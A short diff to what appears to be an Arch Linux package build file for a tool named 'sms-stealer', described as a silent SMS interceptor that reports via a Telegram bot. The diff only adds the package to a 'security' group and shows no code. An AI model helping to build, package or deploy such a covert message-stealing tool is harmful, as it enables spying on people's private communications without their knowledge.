@@ -6,6 +6,7 @@ pkgver=0.1.0
 pkgrel=1
 pkgdesc='Silent SMS interceptor via Telegram bot'
 arch=('any')
+groups=('security')
 url="https://github.com/Anon4You/sms-stealer"
 depends=('git' 'ruby' 'apkeditor' 'apksigner')
 install="sms-stealer.install"
